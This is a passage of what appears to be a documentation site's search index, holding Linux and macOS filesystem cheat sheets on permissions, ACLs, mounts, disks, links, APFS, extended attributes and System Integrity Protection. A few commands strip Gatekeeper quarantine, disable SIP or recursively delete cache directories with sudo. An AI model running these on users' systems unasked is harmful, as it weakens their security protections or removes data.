Mode","text":"<pre><code># Symbolic mode\nchmod u+x file.sh          # Add execute for user\nchmod g-w file.txt         # Remove write for group\nchmod o+r file.txt         # Add read for others\nchmod a+x file.sh          # Add execute for all\nchmod u=rw,g=r,o=r file    # Set exact permissions\n\n# Numeric mode\nchmod 755 file.sh          # rwxr-xr-x\nchmod 644 file.txt         # rw-r--r--\nchmod 600 private.key      # rw-------\nchmod 777 script.sh        # rwxrwxrwx (avoid!)\n\n# Recursive\nchmod -R 755 directory/    # Apply to directory and contents\n\n# Common permissions\nchmod 755 script.sh        # Executable script\nchmod 644 file.txt         # Regular file\nchmod 600 ~/.ssh/id_rsa    # Private key\nchmod 700 ~/.ssh           # SSH directory\nchmod 1777 /tmp            # Sticky bit directory\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#chown-change-ownership","title":"chown - Change Ownership","text":"<pre><code># Change owner\nsudo chown user file.txt\n\n# Change owner and group\nsudo chown user:group file.txt\n\n# Change only group\nsudo chown :group file.txt\n# or\nsudo chgrp group file.txt\n\n# Recursive\nsudo chown -R user:group directory/\n\n# Examples\nsudo chown www-data:www-data /var/www/html/\nsudo chown -R $USER:$USER ~/project/\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#special-permissions","title":"Special Permissions","text":"<pre><code># Setuid (4) - Execute as file owner\nchmod u+s file             # or chmod 4755 file\n# Example: /usr/bin/passwd\n\n# Setgid (2) - Execute as group / inherit directory group\nchmod g+s directory        # or chmod 2755 directory\n# Files created inherit directory group\n\n# Sticky bit (1) - Only owner can delete\nchmod +t directory         # or chmod 1777 directory\n# Example: /tmp\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#umask-default-permissions","title":"umask - Default Permissions","text":"<pre><code># View current umask\numask\n# 0022\n\n# Set umask\numask 0027               # Files: 640, Directories: 750\n\n# Calculate default permissions\n# Files: 666 - umask\n# Directories: 777 - umask\n\n# Examples\numask 0022               # Files: 644, Dirs: 755 (default user)\numask 0077               # Files: 600, Dirs: 700 (private)\numask 0002               # Files: 664, Dirs: 775 (group writable)\n\n# Set permanently in ~/.bashrc\necho \"umask 0027\" &gt;&gt; ~/.bashrc\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#access-control-lists-acl","title":"Access Control Lists (ACL)","text":""},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#view-acl","title":"View ACL","text":"<pre><code># Check if ACL is supported\nmount | grep acl\n\n# View ACL\ngetfacl file.txt\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#set-acl","title":"Set ACL","text":"<pre><code># Give user read/write\nsetfacl -m u:username:rw file.txt\n\n# Give group read\nsetfacl -m g:groupname:r file.txt\n\n# Set default ACL for directory\nsetfacl -d -m u:username:rwx directory/\n\n# Remove ACL\nsetfacl -x u:username file.txt\n\n# Remove all ACL\nsetfacl -b file.txt\n\n# Recursive\nsetfacl -R -m u:username:rwx directory/\n\n# Copy ACL\ngetfacl file1 | setfacl --set-file=- file2\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#filesystem-types","title":"Filesystem Types","text":""},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#common-filesystems","title":"Common Filesystems","text":"<pre><code># ext4 - Fourth Extended Filesystem (default on most Linux)\n# xfs - XFS filesystem (default on RHEL/CentOS 7+)\n# btrfs - B-tree filesystem (CoW, snapshots)\n# f2fs - Flash-Friendly Filesystem (for SSDs)\n# zfs - ZFS filesystem (advanced features)\n# vfat/exfat - FAT filesystems (Windows compatibility)\n# ntfs - NTFS filesystem (Windows)\n\n# Check filesystem type\ndf -T\nlsblk -f\nblkid /dev/sda1\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#mountunmount","title":"Mount/Unmount","text":"<pre><code># Mount filesystem\nsudo mount /dev/sdb1 /mnt\nsudo mount -t ext4 /dev/sdb1 /mnt\n\n# Mount with options\nsudo mount -o ro /dev/sdb1 /mnt           # Read-only\nsudo mount -o rw,noexec /dev/sdb1 /mnt    # No execution\n\n# Unmount\nsudo umount /mnt\nsudo umount /dev/sdb1\n\n# Force unmount\nsudo umount -f /mnt\nsudo umount -l /mnt                        # Lazy unmount\n\n# Check what's using the mount\nlsof +D /mnt\nfuser -m /mnt\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#etcfstab-permanent-mounts","title":"/etc/fstab - Permanent Mounts","text":"<pre><code># Format: device  mountpoint  type  options  dump  pass\nUUID=xxx  /data  ext4  defaults  0  2\n/dev/sdb1  /backup  ext4  defaults,noatime  0  2\n//server/share  /mnt/smb  cifs  credentials=/root/.smbcred  0  0\ntmpfs  /tmp  tmpfs  defaults,noatime,mode=1777  0  0\n\n# Mount all from fstab\nsudo mount -a\n\n# Reload systemd after fstab changes\nsudo systemctl daemon-reload\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#disk-management","title":"Disk Management","text":""},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#disk-information","title":"Disk Information","text":"<pre><code># List block devices\nlsblk\nlsblk -f                   # With filesystem info\n\n# Disk usage\ndf -h                      # Human-readable\ndf -i                      # Inode usage\ndf -T                      # Filesystem type\n\n# Directory size\ndu -sh directory/          # Summary\ndu -h --max-depth=1 .      # First level subdirs\ndu -hac directory/         # All with total\n\n# Largest directories\ndu -hx / | sort -rh | head -20\n\n# Find large files\nfind / -type f -size +100M 2&gt;/dev/null\nfind / -type f -size +1G -exec ls -lh {} \\; 2&gt;/dev/null\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#partition-management","title":"Partition Management","text":"<pre><code># List partitions\nsudo fdisk -l\nsudo parted -l\nlsblk\n\n# Create partition (fdisk)\nsudo fdisk /dev/sdb\n# n (new), p (primary), w (write)\n\n# Create partition (parted)\nsudo parted /dev/sdb\n# mklabel gpt\n# mkpart primary ext4 0% 100%\n\n# Format partition\nsudo mkfs.ext4 /dev/sdb1\nsudo mkfs.xfs /dev/sdb1\nsudo mkfs.vfat -F 32 /dev/sdb1\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#filesystem-check-and-repair","title":"Filesystem Check and Repair","text":"<pre><code># Check filesystem (unmounted!)\nsudo fsck /dev/sda1\nsudo e2fsck -f /dev/sda1   # ext2/3/4\nsudo xfs_repair /dev/sda1   # XFS\n\n# Force check on next reboot\nsudo touch /forcefsck\n\n# Disk check with badblocks\nsudo badblocks -v /dev/sda\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#symbolic-and-hard-links","title":"Symbolic and Hard Links","text":""},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#symbolic-links-soft-links","title":"Symbolic Links (Soft Links)","text":"<pre><code># Create symlink\nln -s /path/to/original /path/to/link\n\n# Examples\nln -s /usr/bin/python3 ~/bin/python\nln -s /var/www/html ~/www\nln -s ../../../file.txt relative-link.txt\n\n# View symlink\nls -l link\n# lrwxrwxrwx 1 user group 15 Jan 15 10:00 link -&gt; /path/to/original\n\n# Read symlink target\nreadlink link\nreadlink -f link           # Follow all symlinks\n\n# Remove symlink\nrm link                    # Don't use trailing slash!\nunlink link\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#hard-links","title":"Hard Links","text":"<pre><code># Create hard link\nln /path/to/original /path/to/link\n\n# View inode\nls -li file\n# 1234567 -rw-r--r-- 2 user group 100 Jan 15 10:00 file\n\n# Hard link count in ls output\nls -l file\n# -rw-r--r-- 2 user group ...\n#            ^ link count\n\n# Find all hard links to file\nfind / -inum 1234567 2&gt;/dev/null\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#differences","title":"Differences","text":"<pre><code># Symbolic Link:\n# - Can link to directories\n# - Can cross filesystems\n# - Breaks if original is deleted\n# - Shows -&gt; in ls output\n\n# Hard Link:\n# - Cannot link to directories\n# - Must be on same filesystem\n# - Remains valid if original is deleted\n# - All links are equal (no \"original\")\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#file-attributes","title":"File Attributes","text":""},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#extended-attributes","title":"Extended Attributes","text":"<pre><code># View attributes\nlsattr file.txt\n\n# Set attributes\nsudo chattr +i file.txt    # Immutable (can't modify/delete)\nsudo chattr +a file.txt    # Append only\nsudo chattr -i file.txt    # Remove immutable\n\n# Common attributes\n# i = immutable\n# a = append only\n# A = no atime update\n# d = no dump\n# s = secure deletion\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#file-capabilities","title":"File Capabilities","text":"<pre><code># View capabilities\ngetcap /usr/bin/ping\n\n# Set capability\nsudo setcap cap_net_raw+ep /usr/bin/ping\n\n# Remove capability\nsudo setcap -r /usr/bin/ping\n\n# Common capabilities\n# cap_net_raw = raw network access\n# cap_net_admin = network admin\n# cap_sys_admin = system admin\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#finding-files","title":"Finding Files","text":""},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#find-command","title":"find Command","text":"<pre><code># By name\nfind /path -name \"*.txt\"\nfind /path -iname \"*.TXT\"      # Case-insensitive\n\n# By type\nfind /path -type f             # Files\nfind /path -type d             # Directories\nfind /path -type l             # Symlinks\n\n# By size\nfind /path -size +100M         # Larger than 100MB\nfind /path -size -1M           # Smaller than 1MB\n\n# By modification time\nfind /path -mtime -7           # Modified in last 7 days\nfind /path -mtime +30          # Modified more than 30 days ago\nfind /path -mmin -60           # Modified in last 60 minutes\n\n# By permissions\nfind /path -perm 644\nfind /path -perm -u+w          # User writable\n\n# By owner\nfind /path -user username\nfind /path -group groupname\n\n# Execute command\nfind /path -name \"*.log\" -exec rm {} \\;\nfind /path -name \"*.txt\" -delete\n\n# Combine conditions\nfind /path -name \"*.log\" -size +10M -mtime +30\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#locate-command","title":"locate Command","text":"<pre><code># Update database\nsudo updatedb\n\n# Search\nlocate filename\nlocate -i filename         # Case-insensitive\nlocate -n 10 filename      # Limit results\n\n# Count matches\nlocate -c filename\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#permissions","title":"Permissions","text":"<ul> <li>Use least privilege principle</li> <li>Avoid 777 permissions</li> <li>Use ACL for fine-grained control</li> <li>Protect sensitive files (600 or 400)</li> <li>Use sticky bit on shared directories</li> </ul>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#organization","title":"Organization","text":"<ul> <li>Follow FHS standards</li> <li>Keep user data in /home</li> <li>Use /opt for third-party software</li> <li>Store logs in /var/log</li> <li>Use /tmp for temporary files</li> </ul>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#security","title":"Security","text":"<ul> <li>Regularly check permissions on sensitive files</li> <li>Monitor /etc for unauthorized changes</li> <li>Use immutable attribute on critical files</li> <li>Audit setuid/setgid binaries</li> <li>Keep /tmp with noexec option</li> </ul>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#maintenance","title":"Maintenance","text":"<ul> <li>Monitor disk usage regularly</li> <li>Clean old logs from /var/log</li> <li>Remove unused packages</li> <li>Check for orphaned files</li> <li>Backup /etc configuration</li> </ul>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#resources","title":"Resources","text":"<ul> <li>FHS 3.0: https://refspecs.linuxfoundation.org/FHS_3.0/</li> <li>Linux Documentation Project: https://tldp.org/</li> <li>Arch Wiki: https://wiki.archlinux.org/</li> <li>man pages: <code>man hier</code>, <code>man chmod</code>, <code>man mount</code></li> </ul>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/","title":"macOS Filesystem Cheat Sheet","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#overview","title":"Overview","text":"<p>macOS uses APFS (Apple File System) by default since macOS High Sierra (10.13). The filesystem structure combines Unix/BSD traditions with Apple-specific directories.</p> <p>Key Features: - APFS with snapshots, encryption, and space sharing - Case-insensitive by default (case-preserving) - Extended attributes for metadata - Resource forks (legacy) - Gatekeeper quarantine attributes</p>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#filesystem-hierarchy","title":"Filesystem Hierarchy","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#root-directory","title":"Root Directory (/)","text":"<pre><code>/\n\u251c\u2500\u2500 Applications/         # Installed applications\n\u251c\u2500\u2500 Library/             # System-wide libraries and support files\n\u251c\u2500\u2500 System/              # macOS system files (read-only)\n\u251c\u2500\u2500 Users/               # User home directories\n\u251c\u2500\u2500 Volumes/             # Mounted volumes\n\u251c\u2500\u2500 bin -&gt; usr/bin       # Essential binaries (symlink)\n\u251c\u2500\u2500 dev/                 # Device files\n\u251c\u2500\u2500 etc -&gt; private/etc   # System configuration (symlink)\n\u251c\u2500\u2500 home -&gt; /System/Volumes/Data/home  # Legacy\n\u251c\u2500\u2500 opt/                 # Optional software\n\u251c\u2500\u2500 private/             # Private system files\n\u251c\u2500\u2500 sbin -&gt; usr/sbin     # System binaries (symlink)\n\u251c\u2500\u2500 tmp -&gt; private/tmp   # Temporary files (symlink)\n\u251c\u2500\u2500 usr/                 # Unix system resources\n\u2514\u2500\u2500 var -&gt; private/var   # Variable data (symlink)\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#applications-installed-apps","title":"/Applications - Installed Apps","text":"<pre><code>/Applications/\n\u251c\u2500\u2500 Safari.app\n\u251c\u2500\u2500 Mail.app\n\u251c\u2500\u2500 TextEdit.app\n\u2514\u2500\u2500 Utilities/\n\n# User-specific applications\n~/Applications/\n\n# View app bundle\nls -la /Applications/Safari.app/\n# Contents/\n#   MacOS/        # Executable\n#   Resources/    # Icons, nibs, etc.\n#   Info.plist    # App metadata\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#library-system-libraries","title":"/Library - System Libraries","text":"<pre><code>/Library/\n\u251c\u2500\u2500 Application Support/  # App support files\n\u251c\u2500\u2500 Caches/              # System caches\n\u251c\u2500\u2500 Fonts/               # System-wide fonts\n\u251c\u2500\u2500 Frameworks/          # Shared frameworks\n\u251c\u2500\u2500 LaunchAgents/        # User launch agents\n\u251c\u2500\u2500 LaunchDaemons/       # System launch daemons\n\u251c\u2500\u2500 Preferences/         # System preferences\n\u251c\u2500\u2500 Logs/                # System logs\n\u2514\u2500\u2500 Developer/           # Developer tools\n\n# Examples\nls /Library/LaunchDaemons/\nls /Library/Fonts/\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#system-macos-system","title":"/System - macOS System","text":"<pre><code>/System/\n\u251c\u2500\u2500 Applications/        # System apps (Mail, Safari, etc.)\n\u251c\u2500\u2500 Library/            # System libraries\n\u2502   \u251c\u2500\u2500 Frameworks/     # System frameworks\n\u2502   \u251c\u2500\u2500 CoreServices/   # Core system services\n\u2502   \u251c\u2500\u2500 Extensions/     # Kernel extensions\n\u2502   \u2514\u2500\u2500 LaunchDaemons/  # System daemons\n\u2514\u2500\u2500 Volumes/\n    \u2514\u2500\u2500 Data/           # User data volume\n\n# Read-only system volume (macOS Catalina 10.15+)\n# Mounted separately from user data\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#users-user-home-directories","title":"/Users - User Home Directories","text":"<pre><code>/Users/\n\u251c\u2500\u2500 Shared/             # Shared files between users\n\u2514\u2500\u2500 username/\n    \u251c\u2500\u2500 Desktop/\n    \u251c\u2500\u2500 Documents/\n    \u251c\u2500\u2500 Downloads/\n    \u251c\u2500\u2500 Library/        # User-specific library\n    \u2502   \u251c\u2500\u2500 Application Support/\n    \u2502   \u251c\u2500\u2500 Caches/\n    \u2502   \u251c\u2500\u2500 Preferences/\n    \u2502   \u251c\u2500\u2500 Logs/\n    \u2502   \u2514\u2500\u2500 Mobile Documents/  # iCloud Drive\n    \u251c\u2500\u2500 Movies/\n    \u251c\u2500\u2500 Music/\n    \u251c\u2500\u2500 Pictures/\n    \u2514\u2500\u2500 Public/\n\n# Shortcuts\necho $HOME              # /Users/username\ncd ~                    # Go to home directory\ncd ~/Documents          # Go to Documents\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#library-user-library","title":"~/Library - User Library","text":"<pre><code>~/Library/\n\u251c\u2500\u2500 Application Support/  # App data\n\u2502   \u251c\u2500\u2500 com.apple.Safari/\n\u2502   \u251c\u2500\u2500 Google/\n\u2502   \u2514\u2500\u2500 Code/\n\u251c\u2500\u2500 Caches/              # User caches\n\u251c\u2500\u2500 Containers/          # Sandboxed app data\n\u251c\u2500\u2500 Group Containers/    # Shared containers\n\u251c\u2500\u2500 Keychains/           # Keychain files\n\u251c\u2500\u2500 Preferences/         # User preferences (.plist files)\n\u251c\u2500\u2500 Safari/              # Safari data\n\u251c\u2500\u2500 Mail/                # Mail data\n\u251c\u2500\u2500 Messages/            # Messages data\n\u251c\u2500\u2500 Logs/                # User logs\n\u251c\u2500\u2500 Saved Application State/\n\u2514\u2500\u2500 Developer/           # Xcode data\n\n# View preferences\ndefaults read com.apple.finder\nls ~/Library/Preferences/\n\n# Hidden by default (since macOS Lion)\nchflags nohidden ~/Library\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#volumes-mounted-volumes","title":"/Volumes - Mounted Volumes","text":"<pre><code>/Volumes/\n\u251c\u2500\u2500 Macintosh HD/        # Main volume (symlinked to /)\n\u251c\u2500\u2500 Time Machine/        # Time Machine backup\n\u251c\u2500\u2500 USB Drive/           # External drives\n\u2514\u2500\u2500 Network Shares/      # Network mounts\n\n# List volumes\nls /Volumes/\ndiskutil list\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#private-private-system-files","title":"/private - Private System Files","text":"<pre><code>/private/\n\u251c\u2500\u2500 etc/                 # System configuration\n\u2502   \u251c\u2500\u2500 hosts\n\u2502   \u251c\u2500\u2500 ssh/\n\u2502   \u251c\u2500\u2500 apache2/\n\u2502   \u2514\u2500\u2500 paths\n\u251c\u2500\u2500 tmp/                 # Temporary files\n\u2514\u2500\u2500 var/                 # Variable data\n    \u251c\u2500\u2500 log/             # System logs\n    \u251c\u2500\u2500 db/              # Databases\n    \u251c\u2500\u2500 folders/         # Temporary folders\n    \u2514\u2500\u2500 root/            # Root user home\n\n# Symlinks point here\n/etc -&gt; /private/etc\n/tmp -&gt; /private/tmp\n/var -&gt; /private/var\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#usr-unix-system-resources","title":"/usr - Unix System Resources","text":"<pre><code>/usr/\n\u251c\u2500\u2500 bin/                 # User binaries\n\u251c\u2500\u2500 lib/                 # Libraries\n\u251c\u2500\u2500 local/               # Locally installed software\n\u2502   \u251c\u2500\u2500 bin/\n\u2502   \u251c\u2500\u2500 lib/\n\u2502   \u2514\u2500\u2500 Cellar/          # Homebrew packages\n\u251c\u2500\u2500 sbin/                # System binaries\n\u251c\u2500\u2500 share/               # Shared data\n\u2502   \u251c\u2500\u2500 man/             # Manual pages\n\u2502   \u2514\u2500\u2500 doc/\n\u2514\u2500\u2500 standalone/          # Standalone tools\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#file-permissions","title":"File Permissions","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#standard-unix-permissions","title":"Standard Unix Permissions","text":"<pre><code># View permissions\nls -l file.txt\n# -rw-r--r--  1 user  staff  1234 Jan 15 10:00 file.txt\n\n# Change permissions\nchmod 755 file.sh\nchmod u+x file.sh\nchmod -R 755 directory/\n\n# Change ownership\nsudo chown user:staff file.txt\nsudo chown -R user:staff directory/\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#macos-specific-flags","title":"macOS-Specific Flags","text":"<pre><code># View flags\nls -lO file.txt\n# -rw-r--r--  1 user staff hidden 1234 Jan 15 10:00 file.txt\n\n# Set hidden flag\nchflags hidden file.txt\nchflags nohidden file.txt\n\n# Set locked flag\nchflags uchg file.txt      # User immutable\nchflags schg file.txt      # System immutable\nchflags nouchg file.txt    # Remove immutable\n\n# Common flags\n# hidden      - Hide from Finder\n# uchg        - User immutable\n# schg        - System immutable\n# nodump      - Exclude from Time Machine\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#extended-attributes-xattr","title":"Extended Attributes (xattr)","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#view-extended-attributes","title":"View Extended Attributes","text":"<pre><code># List files with extended attributes\nls -l@\n# -rw-r--r--@ 1 user staff 1234 Jan 15 10:00 file.txt\n\n# List all extended attributes\nxattr file.txt\n\n# View specific attribute\nxattr -p com.apple.quarantine file.txt\n\n# Show all attributes with values\nxattr -l file.txt\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#common-extended-attributes","title":"Common Extended Attributes","text":"<pre><code># Quarantine (Gatekeeper)\ncom.apple.quarantine       # Downloaded from internet\n\n# Finder info\ncom.apple.FinderInfo       # Finder metadata\n\n# Metadata\ncom.apple.metadata:kMDItemWhereFroms  # Download source\n\n# Resource fork\ncom.apple.ResourceFork     # Legacy resource fork\n\n# Text encoding\ncom.apple.TextEncoding     # Text file encoding\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#manage-extended-attributes","title":"Manage Extended Attributes","text":"<pre><code># Remove specific attribute\nxattr -d com.apple.quarantine file.txt\n\n# Remove all extended attributes\nxattr -c file.txt\n\n# Recursively remove quarantine\nxattr -dr com.apple.quarantine /path/to/app.app\n\n# Copy with attributes\ncp -p file1.txt file2.txt\n\n# Preserve attributes when archiving\ntar -c --xattrs -f archive.tar directory/\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#gatekeeper-quarantine","title":"Gatekeeper Quarantine","text":"<pre><code># View quarantine attribute\nxattr -p com.apple.quarantine downloaded-file\n\n# Remove quarantine (allow app to run)\nxattr -d com.apple.quarantine /Applications/App.app\n\n# Alternative: remove recursively\nsudo xattr -rd com.apple.quarantine /Applications/App.app\n\n# Verify removal\nspctl --assess --verbose /Applications/App.app\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#apfs-apple-file-system","title":"APFS (Apple File System)","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#apfs-features","title":"APFS Features","text":"<pre><code># Space sharing between volumes\n# Copy-on-write (CoW) cloning\n# Snapshots\n# Encryption (FileVault)\n# Crash protection\n\n# View APFS containers\ndiskutil apfs list\n\n# Container structure\ndiskutil list\n# /dev/disk1 (synthesized):\n#    0: APFS Container         disk1\n#    1: APFS Volume \u2068Macintosh HD\u2069\n#    2: APFS Volume \u2068Preboot\u2069\n#    3: APFS Volume \u2068Recovery\u2069\n#    4: APFS Volume \u2068Data\u2069\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#apfs-snapshots","title":"APFS Snapshots","text":"<pre><code># List snapshots\ntmutil listlocalsnapshots /\n\n# Create snapshot\ntmutil localsnapshot\n\n# Delete snapshot\ntmutil deletelocalsnapshots 2025-01-15-123456\n\n# Mount snapshot\nmkdir ~/snapshot\nmount_apfs -s com.apple.TimeMachine.2025-01-15-123456 / ~/snapshot\n\n# Unmount\numount ~/snapshot\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#apfs-clones-instant-copy","title":"APFS Clones (Instant Copy)","text":"<pre><code># Clone file (instant, space-efficient)\ncp -c original.file cloned.file\n\n# or\ncp -cpR original/ cloned/\n\n# Verify clone\nls -li original.file cloned.file\n# Different inodes, but shared data blocks\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#disk-management","title":"Disk Management","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#disk-utility-commands","title":"Disk Utility Commands","text":"<pre><code># List all disks\ndiskutil list\n\n# Information about disk\ndiskutil info disk0\ndiskutil info /\n\n# Erase disk\ndiskutil eraseDisk APFS \"New Volume\" disk2\n\n# Partition disk\ndiskutil partitionDisk disk2 1 GPT APFS \"Data\" 100%\n\n# Mount/Unmount\ndiskutil mount disk2s1\ndiskutil unmount disk2s1\ndiskutil unmountDisk disk2\n\n# Repair disk\ndiskutil verifyVolume /\ndiskutil repairVolume /\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#disk-usage","title":"Disk Usage","text":"<pre><code># Disk usage\ndf -h\ndiskutil info / | grep \"Volume Free Space\"\n\n# Directory size\ndu -sh directory/\ndu -h -d 1 .\n\n# Largest directories\ndu -hd 1 / | sort -rh | head -20\n\n# Storage management\n# System Preferences &gt; General &gt; Storage\n# or\nopen ~/Library/Messages  # Check iMessage storage\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#spotlight-and-metadata","title":"Spotlight and Metadata","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#spotlight","title":"Spotlight","text":"<pre><code># Search with Spotlight\nmdfind \"kind:image\"\nmdfind \"kind:pdf date:today\"\nmdfind -name \"document.pdf\"\nmdfind -onlyin ~/Documents \"project\"\n\n# Metadata query\nmdls file.pdf\n\n# Common attributes\nkMDItemKind\nkMDItemContentType\nkMDItemWhereFroms\nkMDItemDateAdded\n\n# Rebuild Spotlight index\nsudo mdutil -E /\nsudo mdutil -i on /\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#disable-spotlight","title":"Disable Spotlight","text":"<pre><code># Disable indexing\nsudo mdutil -i off /\n\n# Delete index\nsudo mdutil -E /\n\n# Prevent indexing (create .metadata_never_index)\ntouch /Volumes/Drive/.metadata_never_index\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#file-system-case-sensitivity","title":"File System Case Sensitivity","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#default-case-insensitive","title":"Default: Case-Insensitive","text":"<pre><code># macOS default is case-insensitive but case-preserving\n# FILE.txt and file.txt are the same file\n\n# Test\ntouch FILE.txt\nls file.txt\n# FILE.txt (can access with any case)\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#case-sensitive-apfs","title":"Case-Sensitive APFS","text":"<pre><code># Create case-sensitive volume\ndiskutil apfs addVolume disk1 \"Case-sensitive APFS\" \"CaseSensitive\"\n\n# Format options\n# APFS                    - Case-insensitive\n# \"Case-sensitive APFS\"   - Case-sensitive\n# \"APFS (Encrypted)\"      - Encrypted, case-insensitive\n# \"Case-sensitive APFS (Encrypted)\"  - Encrypted, case-sensitive\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#special-directories","title":"Special Directories","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#application-support","title":"Application Support","text":"<pre><code># System\n/Library/Application Support/\n\n# User\n~/Library/Application Support/\n\n# Example paths\n~/Library/Application Support/Code/\n~/Library/Application Support/Google/Chrome/\n~/Library/Application Support/Sublime Text/\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#preferences","title":"Preferences","text":"<pre><code># Stored as .plist files\n~/Library/Preferences/com.apple.Safari.plist\n~/Library/Preferences/com.apple.finder.plist\n\n# Read preferences\ndefaults read com.apple.finder\n\n# Write preferences\ndefaults write com.apple.finder AppleShowAllFiles true\n\n# Delete preference\ndefaults delete com.apple.finder AppleShowAllFiles\n\n# Reload Finder\nkillall Finder\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#caches","title":"Caches","text":"<pre><code># System cache\n/Library/Caches/\n/System/Library/Caches/\n\n# User cache\n~/Library/Caches/\n\n# Clear user caches\nrm -rf ~/Library/Caches/*\n\n# Clear system caches (requires sudo)\nsudo rm -rf /Library/Caches/*\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#hidden-files","title":"Hidden Files","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#view-hidden-files","title":"View Hidden Files","text":"<pre><code># In Finder\n# Press: Cmd + Shift + .\n\n# In Terminal (always visible)\nls -la\n\n# Show all files in Finder (permanently)\ndefaults write com.apple.finder AppleShowAllFiles true\nkillall Finder\n\n# Hide again\ndefaults write com.apple.finder AppleShowAllFiles false\nkillall Finder\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#common-hidden-files","title":"Common Hidden Files","text":"<pre><code>~/.bashrc, ~/.zshrc      # Shell configuration\n~/.ssh/                  # SSH keys\n~/.config/               # XDG config\n~/.Trash/                # User trash\n.DS_Store                # Finder metadata\n.localized               # Localization hint\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#system-integrity-protection-sip","title":"System Integrity Protection (SIP)","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#check-sip-status","title":"Check SIP Status","text":"<pre><code>csrutil status\n# System Integrity Protection status: enabled\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#protected-directories","title":"Protected Directories","text":"<pre><code># SIP protects these even from root:\n/System\n/usr (except /usr/local)\n/bin\n/sbin\n/var\n\n# Can't modify even with sudo\nsudo rm /System/Library/SomeFile\n# Operation not permitted\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#disable-sip-not-recommended","title":"Disable SIP (not recommended)","text":"<pre><code># 1. Boot into Recovery Mode (Cmd+R)\n# 2. Open Terminal\ncsrutil disable\n# 3. Reboot\n\n# Re-enable\ncsrutil 